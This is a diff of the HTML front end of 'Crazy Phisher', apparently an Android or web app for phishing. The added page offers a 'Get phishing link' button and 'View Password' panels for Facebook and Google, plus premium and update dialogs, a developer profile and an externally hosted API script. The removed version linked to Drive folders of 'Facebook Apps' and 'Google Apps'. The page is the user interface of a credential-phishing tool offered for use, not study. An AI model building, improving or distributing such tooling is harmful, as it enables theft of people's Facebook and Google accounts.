@@ -1,64 +1,320 @@
 <!DOCTYPE html>
 <html>
 <head>
+<meta http-equiv="Content-Type" content="text/html; charset=UTF-8"/>
 <meta name="viewport" content="width=device-width, initial-scale=1.0">
-<link href="./../assets/css/style.css" type="text/css" rel="stylesheet"/>
-<link href="./../assets/css/mdb.min.css" type="text/css" rel="stylesheet"/>
-<link href="./../assets/fa/css/all.min.css" type="text/css" rel="stylesheet"/>
-<link href="./../assets/fonts/all.css" type="text/css" rel="stylesheet"/>
+<link href="assets/css/style.css" type="text/css" rel="stylesheet"/>
+<link href="assets/css/mdb.min.css" type="text/css" rel="stylesheet"/>
+<link href="assets/fa/css/all.min.css" type="text/css" rel="stylesheet"/>
+<link href="assets/fonts/all.css" type="text/css" rel="stylesheet"/>
 <title></title>
 </head>
-<body class="mb-5 pb-5" id="body" >
-<nav class="navbar fixed-top pr-1 py-2 bg-white " >
-<div class=" ms-2  rounded-4 " onclick="history.back()"> 
-<div class="btn-back shadow-1 text-center rounded-4" >
-<span class="btn px-3 py-1 btn-secondary rounded-4" >
-<i class="fad fa-arrow-left" ></i>
-</span>
-</div>
+<body class="" id="body" >
+<nav class="navbar fixed-top py-2 bg-white " >
+<div class="ripple  ms-2 rounded-4 " > 
+<img src="./assets/img/logo.png" width="40" height="40" class="d-inline-block align-top rounded-circle " alt="">
 </div>
 <div class="p-0 dm-sans  m-0 h3" >
 <span class="text-danger" >Crazy</span> <span class="text-success" >Phisher </span>
 </div>
 <div class="premium-badge">
 <span class="acc-type d-block position-static mt-0 me-3 vt" >Free</span>
-</div></nav>
 
-<div class="tab-min shadow-5-strong" onclick="history.back()" >
+<!--<a href="#" class=" ripple btn rounded-circle p-0 me-2 "  >
+<img src="./assets/img/premiumbadge.png" width="40" class="d-inline-block align-top  tapped " alt=""></a>
+-->
+</div>
+</nav>
+</div>
+</menu>
+<section class="windows" >
 
-</div>  
+<div class="window px-2 d-flex position-fixed align-items-center justify-content-center " id="premium-window" >
+<div class="card  mx-3 premium-wcard" >
+   <div class="bg-image hover-overlay ripple" data-mdb-ripple-color="light">
+    <img src="assets/img/pr-11.png"  class="img-fluid"/>
+    <a href="#!">
+      <div class="mask" style="background-color: rgba(251, 251, 251, 0.15);"></div>
+    </a>
+  </div>
+
+
+</div>
+
+<div class="window px-2 d-none position-fixed align-items-center justify-content-center " id="update-window" >
+<div class="card mx-4 update-card" >
+<div class="bg-image hover-overlay ripple" data-mdb-ripple-color="light">
+    <img src="assets/img/img_update_dialog1.png"  class="img-fluid"/>
+    <a href="#!">
+      <div class="mask" style="background-color: rgba(251, 251, 251, 0.15);"></div>
+    </a>
+  </div>
+ 
+<div class="card-body px-2 pt-2  text-center ">
+ <h5 class="card-title jost text-primary ">New version available!</h5>
+ <div class="card-text  "> 
+ <ul class="text-start dm-sans" id="newfeatures" >
+</ul>
+ </div>
+ 
+ 
+ <a href="#!" class="btn me-1 btn-primary btn-rounded update-btn">
+ <i class="fad fa-rocket " > </i> 
+ Update now
+ </a>
+<button class="btn btn-later ms-1 btn-outline-secondary text-violate btn-rounded" id="later" >
+ <i class="fad fa-sync-alt" > </i> 
+ Later</button>
+ 
+</div>
+</div>
+</div>
+
+<div class="window unwired px-2 position-fixed align-items-center justify-content-center " id="offline-window" style="opacity:1;" >
+<div class="card mx-3 py-2 offline-card " >
+<div class="bg-image hover-overlay ripple" data-mdb-ripple-color="light">
+    <img src="assets/img/vp_ic_net_error.png"  class="img-fluid"/>
+    <a href="#!">
+      <div class="mask" style="background-color: rgba(251, 251, 251, 0.15);"></div>
+    </a>
+  </div>
+ 
+<div class="card-body px-2 pt-2  text-center ">
+ <span class="card-title  gentium text-primary ">No internet connection!</span><br>
+ 
+<button class="  btn btn-reload mt-2 btn-outline-secondary text-violate btn-rounded" id="reload" >
+ <i class="fad fa-sync-alt" > </i> 
+ Reload</button>
+ 
+</div>
+</div>
+</div>
+
+<div class="window alert-warning px-2 d-none position-fixed align-items-center justify-content-center "  id="login-window" >
+
+<div class="card m-1 text-center "   >
+<div class="bg-image unwired hover-overlay ripple" data-mdb-ripple-color="light">
+    <img src="assets/img/oops.png"  class="img-fluid"/>
+    <a href="#!">
+      <div class="mask" style="background-color: rgba(251, 251, 251, 0.15);"></div>
+    </a>
+  </div>
+  <div class="unwired" >
+ <button class="btn btn-info w-100" >You're offline</button>
+ </div>
+<div class="wired" >
+<span class="acc-type vt mt-3 me-2" >Free</span>
+<div class="card mt-4 icon-cp rounded-circle " >
+ <img class="card-img-top " src="./assets/img/logo.png"  alt="">
+ </div>
+ <div class="card-body">
+ <div class="card-title dm-sans h2" ><span class="text-danger" > Crazy</span> <span class="text-success" > Phisher</span> </div>
+</div>
+</div>
+
+</div>
+
+
+</section>
+
+
+
+<main class="m-2" >
+
+<section class="active-section mb-3 section " id="home" >
+
+<div class="welcome ripple mb-3" data-mdb-ripple-color="light"> 
+<div class="card p-2 pb-1 text-center " >
+<h2 class="pe-5 " > Hi, <span>Guay</span>
+</h2>
+<h6 class="ps-2" >Welcome <span class="" > back</span>!</h6>
+</div>
+</div>
+
+
+<div class="card alert-primary text-center pb-4 p-3" >
+<div class="mt-3 mb-4" >
+<a href="./index.html" class="mx-4 d-flex align-items-center justify-content-center "  id="getApps"  >
+<span class="hover-shadow  p-0 rounded-pill " >
+<button class="btn d-flex align-items-center justify-content-center bg-white btn-outline-primary px-4 py-2 btn-rounded"  >
+<img src="assets/img/ic_tile_download.png" class="me-1" width="40px"   >
+<span class="ms-1" >Get phishing link</span></button></span>
+</a>
+</div>
+
+<h2 class="text-primary d-none mx-4 mb-3 pb-2 border-primary border-bottom " >View Password</h2>
+<div class="d-flex " >
+<div class="card w-100 m-2 ms-0 text-center " id="facebookPass" >
+  <div class="bg-image py-3 hover-overlay ripple" data-mdb-ripple-color="light">
+    <img src="assets/svg/facebook.svg" class="img-fluid"/>
+    <a href="./facebook.html">
+      <div class="mask" style="background-color: rgba(251, 251, 251, 0.15);"></div>
+    </a>
+  </div>
+  <a href="./facebook.html"  class=" btn btn-primary" > Facebook </a>
+</div>
+<div class="card me-0 m-2 w-100 text-center " id="googlePass" >
+  <div class="bg-image py-3 hover-overlay ripple" data-mdb-ripple-color="light">
+    <img src="assets/svg/google.svg" class="img-fluid"/>
+    <a href="./google.html">
+      <div class="mask" style="background-color: rgba(251, 251, 251, 0.15);"></div>
+    </a>
+  </div>
+  <a  href="./google.html"   class=" btn btn-primary" > Google </a>
   
-<main class="m-2 mt-0" >
+  
 
-<div class="card m-1 mt-5 p-3 text-center " >
-<h5 class="mb-3 text-primary " ><i class="fab fa-facebook" ></i> Facebook Apps</h5>
-<input type="url" value="https://drive.google.com/drive/folders/1-BChyfxQZozxD5G-gy6U0b5RSr6xKTtb" class="form-control "  >
-<a href="https://drive.google.com/drive/folders/1-BChyfxQZozxD5G-gy6U0b5RSr6xKTtb" 
-class="btn btn-primary "  >Open Link</a>
+</div>
+</section>
+<section class="section" id="premium" >
+<div class="" >
+<div class="card premium-card mx-1 pb-2" >
+   <div class="bg-image hover-overlay ripple" data-mdb-ripple-color="light">
+    <img src="assets/img/tele.png"  class="img-fluid"/>
+    <a href="#!">
+      <div class="mask" style="background-color: rgba(251, 251, 251, 0.15);"></div>
+    </a>
+  </div>
+ 
+</div>
+</div>
 </div>
 
-<div class="card m-1 mt-5 p-3 text-center " >
-<h5 class="mb-3 text-primary " ><i class="fab fa-google" ></i> Google Apps</h5>
-<input type="url" value="https://drive.google.com/drive/folders/1-4f0vIbyL1FjMGT528fZA4jG_Rt18j2Y" class="form-control " >
-<a href="https://drive.google.com/drive/folders/1-4f0vIbyL1FjMGT528fZA4jG_Rt18j2Y" 
-class="btn btn-primary "  >Open Link</a>
 </div>
+</section>
+
+<section class="section page" id="page"  >
+
+<div class="spinner d-flex align-items-center justify-content-center " >
+
+<div class="spinner-grow text-primary" role="status">
+  <span class="visually-hidden">Loading...</span>
+</div>
+<div class="spinner-grow text-secondary" role="status">
+  <span class="visually-hidden">Loading...</span>
+</div>
+<div class="spinner-grow text-success" role="status">
+  <span class="visually-hidden">Loading...</span>
+</div>
+<div class="spinner-grow text-danger" role="status">
+  <span class="visually-hidden">Loading...</span>
+</div>
+<div class="spinner-grow text-warning" role="status">
+  <span class="visually-hidden">Loading...</span>
+</div>
+<div class="spinner-grow text-info" role="status">
+  <span class="visually-hidden">Loading...</span>
+</div>
+
+</div>
+
+</section >
+ </a>
+ </div></div>
+<h3 class="mb-0 mt-5 pb-0 text-start ms-3 text-info " ><i class="fab fa-android" ></i> Developer</h3>
+ <div class=" mx-0 mt-0" id="dev-option"  >
+ <div class=" myProfileCard" >
+ <div class="myProfile" data-state="#ProfileAbout">
+ <div class="myProfile-header">
+ <div class="myProfile-cover" style="background-image: url('./assets/img/ic_tile_download.png')"></div>
+ <img class="myProfile-avatar" src="./assets/img/shanto.png" alt="avatar" />
+ <h1 class="myProfile-fullname">Thorn Bunthy</h1>
+ <h2 class="myProfile-jobtitle"> Android & Web Developer</h2>
+ </div>
+ <div class="myProfile-main">
+ <div class="myProfile-section is-active" id="ProfileAbout">
+ <div class="myProfile-content">
+ <div class="myProfile-subtitle">ABOUT</div>
+ <p class="myProfile-desc">I'm  bunthy A web developer and designer. I have learnt Web development including Html, CSS, Python,php& JavaScript.
+ I also have some knowledge in Android development and reverse engineering!
+ </p>
+ </div>
+ <div class="myProfile-social">
+<a href=" https://facebook.com/msin.shanto.islam/ " >  
+  <i class="fab fa-facebook" ></i>
+</a>
+ <a href="https://youtube.com/c/MSINGamesHacks/" >  
+ <i class="fab fa-youtube" ></i>
+ </a>
+ <a href=" https://github.com/MSIN-Shanto/ " >  
+ <i class="fab fa-github" ></i>
+ </a>
+ <a href=" https://codepen.io/MSIN-Shanto/ " >  
+ <i class="fab fa-codepen" ></i>
+ <a href=" https://instagram.com/msin.shanto/ " >  
+ <i class="fab fa-instagram" ></i>
+ </a>
+ <a href="https://shantoislam.cf/ " >  
+ <i class="fab fa-chrome" ></i>
+ </a>
+ </a>
+ </div>
+ </div>
+ <div class="myProfile-section" id="experience">
+ <div class="myProfile-content">
+ <div class="myProfile-subtitle text-info  "><b>MY PROJECTS</b>
+ </div>
+ 
+<div class="myProfile-timeline">
+
+<div class="myProfile-item" >
+  <div class="myProfile-item-title text-start ms-2 ">Website</div>
+  
+  <div class="card ms-3 text-center shadow border-0  p-0 pt-4 mt-0" >
+  <span class="h4 text-info mb-0 pb-0" > <img src="assets/img/shanto.png " class="rounded-circle shadow-outline me-2"  style="width:45px;"  > Shanto Islam  </span>  <small class=" ps-4 text-info " >Portfolio website</small>
+  <a href="https://shantoislam.cf/" class="btn visit-btn btn-info " > <i class="fad fa-link" ></i> Visit Website </a>
+  </div>
+</div>
+ <div class="myProfile-item" >
+  <div class="myProfile-item-title text-start  ms-2 ">Apps </div>
+  <div class="card ms-3 text-center shadow border-0 p-0 pt-4 mt-0" >
+  <span class="h3 text-info " >BunthyApp</span> <small class="mb-3 text-info " >Android app</small>
+  <a href="https://naikathisecondaryschool.web.app/" class="btn nss-dl-link btn-info " > <i class="fad fa-arrow-down" ></i>  Download App </a>
+  </div>
+  <div class="card ms-3 text-center shadow border-0 p-0 pt-4 mt-4" >
+  <span class="h3 text-info " >Crazy Phisher</span> <small class="mb-3 text-info " >Android app</small>
+  <a href=" https://crazyphisher.web.app/ " class="btn btn-info " ><i class="fad fa-arrow-down" ></i> Download App</a>
+  </div>
+  
+</div>
+
+
+ </div>
+ 
+ </div>
+<iframe src="#"   name="form-target"  class="d-none" id="formTarg"  ></iframe>
+
+</section>
 
 </main>
 
+<footer class="mb-5 pb-5"  >
+<!--<div>
+<div class="card d-flex align-items-center justify-content-center" >
+<img src="assets/img/logo.png" width="100px"  >
+</div>
+</div>-->
+<div class="card m-2 mt-5 shadow-strong" >
+<div class="card py-0 ripple text-center m-3 border-0 shadow-0" >
+<span class="acc-type vt" >Free</span>
+<span class="acc-type  d-none" >Premium</span>
+ <div class="card mt-4 icon-cp rounded-circle " >
+ <img class="card-img-top " src="./assets/img/logo.png"  alt="">
+ </div>
+ <div class="card-body">
+ <div class="card-title dn-sans h5" ><span class="text-danger" > Crazy</span> <span class="text-success" > Phisher</span> </div>
+ <div class="card-text text-black-50 vt" ><span class="cp-v">VERSION: <b> 1.0 </b></span></div>
+ </div>
+ </div>
+</div> 
 
-<script type="text/javascript">
+</footer>
 
-let cpBtn = document.querySelectorAll(".form-control");
-let copyText = document.querySelectorAll(".form-control");
-
-for(let i=0 ; i < cpBtn.length;i++){
-
-cpBtn[i].onclick= function(){
-copyText[i].select();
-  copyText[i].setSelectionRange(0, 99999); // For mobile devices
- }
-}
-</script>
+<div id="newScript" >
+</div>
+<script src="assets/js/version.js"></script>
+<script src="assets/js/app.js"></script>
+<script src="https://shantoislam.cf/lib/cp/free/api.js"></script>
+<script src="assets/js/mdb.min.js" type="text/javascript"></script>
 </body>
 </html>
